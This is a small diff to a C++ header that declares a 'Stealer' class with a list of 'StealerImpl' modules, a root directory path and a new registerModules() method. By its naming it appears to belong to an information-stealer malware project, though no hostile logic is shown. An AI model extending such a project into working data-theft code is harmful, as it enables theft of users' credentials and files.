@@ -6,12 +6,16 @@
 #define STEALER_STEALER_H
 #include "../Includes.h"
 #include "StealerImpl.h"
+#include <thread>
 
 class Stealer {
 public:
     Stealer();
+
     void run();
 private:
+    void registerModules();
+
     fs::path root_dir;
     std::list<StealerImpl*> modules;
 };
